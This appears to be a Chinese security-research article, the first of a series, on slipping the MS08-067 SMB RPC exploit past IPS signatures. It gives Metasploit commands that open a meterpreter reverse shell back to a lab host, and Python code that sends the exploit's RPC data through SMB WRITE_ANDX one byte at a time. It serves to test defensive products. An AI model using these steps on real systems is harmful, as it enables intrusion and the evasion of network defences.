**本文是一系列SMB绕过文章中的第一篇，后续会按照下列的路线图进行持续的分享各种绕过SMB RPC类漏洞防御的方法：**

> SMB RPC类漏洞攻防对抗系列（一）---利用SMB_COM_WRITE_ANX分割PRC流量特征
>
> SMB RPC类漏洞攻防对抗系列（二）---SMBRPC分段请求尝试检测突破
>
> SMB RPC类漏洞攻防对抗系列（三）---使用impacket开源库构造SMB-RPC请求详解
>
> SMB RPC类漏洞攻防对抗系列（四）---再次利用SMB_COM_WRITE_ANX分割PRC流量特征
>
> SMB RPC类漏洞攻防对抗系列（五）---利用SMB_COM_TRANSACTION命令绕过检测
>
> SMB RPC类漏洞攻防对抗系列（六）---利用与漏洞产生原理变换检测特征
>
> 本文主要讲解如何利用已有的公开EXP，经过变换攻击方式，对安全产品的防绕过能力进行探测。

面向读者对象:

> 1、不精通反汇编的新手；
>
> 2、SMB协议小白，想了解SMB漏洞协议绕过测试的人员；
>
> 3、想了解已购买的安全产品防御能力的甲方安全从业人员；
>
> 4、想了解安全产品的常见的防御策略的甲方安全从业人员。

通过阅读本文之后，你能收获到：利用网上的EXP，建立SMB高危漏洞攻击绕过集，并测试安全产品的防御能力(请勿做非法攻击)。

本文不包含内容:

> 1、漏洞的详细分析（涉及到的漏洞详细分析，文章结尾有可参考资料）；
>
> 2、内存保护的突破技术等；
>
> 3、Shellcode构造

本文将通过讲述MS08-067（CVE-2008-4250）的公开EXP来讲述SMB漏洞检测协议绕过相关主题。

内网搭建实验环境如下图:

![](https://image.3001.net/images/20200430/1588244923_5eaab1bbe4ef9.png!small)

首先在【环境1】中通过kali的metasploit工具来获取MS08-067的攻击流量(后续会用到):

> (1)运行: msfconsole
>
> (2)输入命令: use exploit/windows/smb/ms08_067_netapi
>
> (3)设置payload: set PAYLOAD windows/meterpreter/reverse_tcp
>
> (4)设置payload反连接的本机IP: set lhost 10.100.3.189
>
> (5)设置payload反连接的本机Port: set lport 4444
>
> (6)设置测试学习用的靶机IP: set rhost 10.100.3.197
>
> (7) 开始运行MSF框架提供的EXP： exploit
>
> (8) 利用成功后可进入meterpreter，进行远程靶机执行命令。

公开EXP利用成功效果如图:

![](https://image.3001.net/images/20200430/1588245113_5eaab279cb9b6.png!small)

然后搭建【环境2】，重复刚才的步骤，如果攻击没成功，表明安全产品可拦截MS08-067。我尝试的几个主流的带IPS功能的防火墙均可以拦截MSF脚本08-067攻击。

根据MSF的信息，可以看到利用成功的靶机是Windows 2000 SP4。

Kali的metasploit的MS08-067的EXP脚本路径如下:

    
    
    /usr/share/metasploit-framework/modules/exploits/windows/smb/ms08_067_netapi.rb

通过阅读MSF MS08-067的代码，可知EXP主要包含以下部分:

![](https://image.3001.net/images/20200430/1588245206_5eaab2d66a9d2.png!small)

由于RPC请求属于SMB的正常的功能，好的安全产品不应该拦截用户的正常的RPC请求；因此，绕过重点集中在【发送攻击RPC】阶段。

之前捕获的攻击PCAP包如下。根据MSF EXP及网上分析，我们可以得知攻击的产生的部位在SMB
RPC请求的NetPathCanonicalize方法调用。现在看一下对应的数据包长什么样子。点开pcap，可以看到如下内容：

![](https://image.3001.net/images/20200430/1588245273_5eaab319b911d.png!small)

即在SMB中一个RPC消息(其他形式的后续文章讲解)至少可以按下列层次分析:

![](https://image.3001.net/images/20200430/1588245330_5eaab3523dfdc.png!small)

本文采取的思路是了解SMB WRITE ANDX 命令（可以查看微软文档[MS-CIFS]-180912，2.2.4.43节），看是否可以产生绕过。

根据对微软MS-CIFS文档SMB_COM_WRITE_ANDX命令说明的简单的阅读；可以得知，这个命令的作用是将数据写入到FID指定的文件或者PIPE管道中；这里是将RPC的数据写入到管道中，RPC消息完整完整后，会调用RPC对应的方法去处理。

根据参考文档的各种分析，可以知道MS08-067的漏洞触发的条件之一是RPC的参数Path中存在路径穿越
/../../；此特征较明显，因此防御人员很可能通过此特征进行拦截（其他的防火墙防御思路，后续文章介绍）。

因此可以考虑将RPC分多次一字节一字节的采用SMB_COM_WRITE_ANDX命令写入到PIPE中看SMB是否支持(毫无疑问是支持的)，这样可能会将安全产品检测的特征拆分开来，有可能绕过一些依赖规则匹配的安全产品。

一个SMB RPC常用的建立流程如下:

![](https://image.3001.net/images/20200430/1588245460_5eaab3d4444a1.png!small)

#上图，箭头上标记的字段代表上一阶段产生的在程序中会被下一阶段利用到的信息。(其他的信息可依赖程序暂不用关注)

考虑到SMB流程实现的复杂性，因此，本文章不会从零开始讲述如何实现SMB协议传输RPC数据；文章会调用开源python库impacket来完成：SMB协商认证，SMB
RPC
bind；但是在RPC调用阶段会实现自己的RPC调用信息发包函数write_anx_dt，加深读者对SMB协议的理解(后续文章会介绍另外的绕过方法，开源库无对应实现，需要读者熟悉此处的结构)。

前4个阶段可以通过下列代码很容易的实现（后续文章会讲解代码）:

  

    
    
    target='10.100.3.197' #靶机地址；请根据自身测试IP修改
    fname='\\BROWSER'
    trans_name = '\\PIPE\\'
     
    #下列参数信息可维持原样即可
    con = smb.SMB(target, target, my_name = 'zhangfan', timeout=5) 
    con.login('','')
    tid = con.tree_connect_andx('\\\\' + target + '\\IPC$')
    fid = con.nt_create_andx(tid, fname)
    uid = con._uid 
    pid = os.getpid() & 0xFFFF
    print('get pid: %d\n' % pid)    

第5阶段 SMB RPC bind，会在下一篇文章循序渐进的讲解，暂时使用提供的代码即可。

本文的关键点是下列的第6阶段，构造SMB_COM_WRITE_ANDX结构消息发送RPC数据。

一个SMB_COM_WRITE_ANDX的结构可以描述如下：

    
    
    SMB_Parameters
    
    {
    
    UCHAR WordCount;//表示SMB_Parameters结构体的长度，单位是字(=2btye)，不包含自身长度，维持原样
    
    Words
    
    {
    
    UCHAR AndXCommand;
    
    UCHAR AndXReserved;
    
    USHORT AndXOffset;
    
    USHORT FID;//唯一的需要依赖外部的数据。其余的数据可以构造。
    
    ULONG Offset;
    
    ULONG Timeout;
    
    USHORT WriteMode;
    
    USHORT Remaining;//剩余的未发送的数据的字节数(包含当前的传输的数据字节数)。
    
    USHORT Reserved;
    
    USHORT DataLength;//发送的数据的长度
    
    USHORT DataOffset;//SMB_Data在整个SMB数据包中的偏移OFFSET字节数，以SMB头部为起始。
    
    ULONG OffsetHigh (optional);
    
    }
    
    }
    
    SMB_Data
    
    {
    
    USHORT ByteCount;//后续发送的字节的长度
    
    Bytes
    
    {
    
    UCHAR Pad;
    
    UCHAR Data[DataLength];
    
    }
    
    }

上述字段中只需要关注蓝色标记的字段，其他字段维持原样即可。

因此，一个SMB_COM_WRITE_ANDX的消息可以通过下列的函数获取:

    
    
    def gen_smb_hd(cmd, tid, pid, uid, mid):
        smb_hdr = "\xff\x53\x4d\x42" + cmd + \
        "\x00\x00\x00\x00\x18\x01\x48\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" +\
        struct.pack("H",tid) + \
        struct.pack("H",pid) + \
        struct.pack('H',uid) + \
        struct.pack('H',mid) 
    return smb_hdr
     
    #trans_byte:WRITE ANDX真正传输的数据
    #fid: 写入的PIPE/文件的句柄
    #mid: 不影响当前的SMB传输，后续文章其他绕过介绍。
    def write_anx_dt(fid, mid, trans_byte):
    dataoffset = 0
    #tid:全局，在SMB RPC 
    #pid:全局，用于标记区分一个SMB会话是客户端哪个进程产生的。
        #uid:全局，SMB建立会话后，服务端返回给客户端的一个登录成功ID（user id）。
        smb_hd = gen_smb_hd('\x2f', tid, pid, uid, mid)
    data_offset = len(smb_hd) + 1 + 0x0e *2  #len(write_req) 
     
    #下列是结构参照SMB_Parameters构造
        write_req = "\x0e" +  \
            '\xff' +\
            '\xff' + \
            '\x00\x20' +\
            struct.pack('H', fid) + \
            struct.pack('I', 0) + \
            struct.pack('I', 0) + \
            struct.pack('H', 0x0008) +\
            struct.pack('H', 0) +\
            struct.pack('H', 0) + \
            struct.pack('H', len(trans_byte)) +\
            struct.pack('H', data_offset) + \
            struct.pack('I', 0) + \
            struct.pack('H', len(trans_byte))#SMB_Data结构的ByteCount
     
     
        trans_1seg = smb_hd + write_req + trans_byte
    return trans_1seg 
     
    #上述的函数write_anx_dt可直接使用impacket的函数发送
    #con.write_andx(tid, fid, dt[idx])  
    

构造好SMB_COM_WRITE_ANDX的消息发送函数之后，就可以分段一个字节一个字节的发送RPC的数据了(对应上图步骤的SMB RPC
CALL阶段)，代码如下：  

    
    
    #dt对应的是需要发送的RPC的字节数据
    for ofst in range(0, len(dt)):
        snd_dt = write_anx_dt(fid, ofst, dt[ofst:ofst+1])
        con._sess.send_packet(snd_dt)
        con.recvSMB()
        print ofst  
    

至此；本文已经介绍了一个RPC的第1~4阶段，第6阶段，可以满足MS08-067的绕过需求。

下面提供一个绕过方法的模板，如果你有自己构造的利用，可以直接在这里，传入RPC中的相关字段（或者直接将wireshark中的RPC的内容复制出来，赋值给变量dt；注意：此时需要将context
id的值修改为0）：

#prefix:RPCNetPathCanonicalize的prefix字段

#path_all:RPCNetPathCanonicalize的path字段

#如果你能熟练的构造MS08-067的SHELLCODE，可以在此处传入SHELLCODE相关的构造

dt=gen_payload_rpc(prefix,path_all)

模板脚本如下（不包含攻击，绕过手法模板）:

[
_https://github.com/KiloMaster/placeholder/blob/master/SMB_RPC_bypass_1.py_](https://github.com/KiloMaster/placeholder/blob/master/SMB_RPC_bypass_1.py)。

感兴趣者，可以使用上述的提供的模板，对自己的防御情况进行检测。

系列二将围绕网络层攻防对抗的特征，继续分析基于SMB高危漏洞网络攻防对抗：SMBRPC分段请求尝试检测突破。

MS08-067的详细分析参考：

> （1）:《Metasploit渗透测试魔鬼夏令营》，作者:诸葛建伟，196页。
>
> （2）:《0day安全:软件漏洞分析技术（第二版）》，第26章:RPC入侵
>
> （3）: 【看雪论坛】<https://www.pediy.com/kssd/pediy10/80416.html>

 ***本文作者：深信服千里目安全实验室，转载请注明来自FreeBuf.COM**  

